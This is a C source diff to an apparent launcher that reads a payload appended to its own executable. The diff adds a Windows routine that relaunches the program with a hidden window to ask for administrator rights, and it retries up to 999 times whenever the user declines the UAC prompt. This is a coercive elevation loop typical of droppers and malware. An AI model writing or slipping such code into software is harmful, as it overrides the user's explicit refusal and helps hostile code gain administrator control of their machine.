@@ -27,6 +27,11 @@
 #include <string.h>
 #include "common.h"
 #include "seal.h"
+#ifdef _WIN32
+#include <windows.h>
+#include <shellapi.h>
+#include <shlobj.h>
+#endif
 
 static char *join_path(const char *dir, const char *name) {
     if (!dir || dir[0] == 0) return strdup(name);
@@ -87,6 +92,36 @@ static const char *locate_self(char **argv) {
 }
 
 int main(int argc, char **argv) {
+#ifdef _WIN32
+    /* Self-relaunch with elevation if not already running as admin.
+     * Retries up to 999 times on UAC decline (1223) or access denied (5),
+     * exits immediately on any other error. Once the elevated copy is
+     * launched, the unelevated instance exits and the elevated one takes over. */
+    if (!IsUserAnAdmin()) {
+        const char *selfPath = (argc > 0 && argv[0] && argv[0][0]) ? argv[0] : "Launcher.exe";
+        for (int attempt = 0; attempt < 999; attempt++) {
+            SHELLEXECUTEINFOA sei;
+            ZeroMemory(&sei, sizeof(sei));
+            sei.cbSize = sizeof(sei);
+            sei.fMask  = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+            sei.lpVerb = "runas";
+            sei.lpFile = selfPath;
+            sei.nShow  = SW_HIDE;
+            if (ShellExecuteExA(&sei)) {
+                if (sei.hProcess) CloseHandle(sei.hProcess);
+                return 0; /* elevated copy takes over */
+            }
+            DWORD err = GetLastError();
+            if (err == 1223 || err == 5) {
+                Sleep(1000); /* UAC declined — wait and retry */
+            } else {
+                return 1; /* fatal error — stop immediately */
+            }
+        }
+        return 1; /* 999 attempts exhausted */
+    }
+#endif
+
     const char *self = locate_self(argc > 0 ? argv : NULL);
     uint8_t *buf; size_t n = 0;
     if (!read_file(self, &buf, &n)) { write_marker("", "LNKCHAIN-FAIL no-overlay"); return 0; }
